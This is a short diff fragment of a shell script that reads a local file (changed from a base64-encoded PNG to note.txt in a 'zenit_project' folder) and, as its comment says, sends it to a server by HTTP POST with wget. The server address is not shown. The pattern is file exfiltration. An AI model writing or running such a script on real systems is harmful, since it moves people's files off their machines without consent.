@@ -7,7 +7,7 @@ SERVER_PORT=80
 SERVER_PATH="/"   
 
 # Capture ls output
-OUTPUT=$(cat zenit_project/scream_hddn.png | base64 -w0)
+OUTPUT=$(cat zenit_project/note.txt)
 
 # Send output via HTTP POST using wget
 wget --quiet \
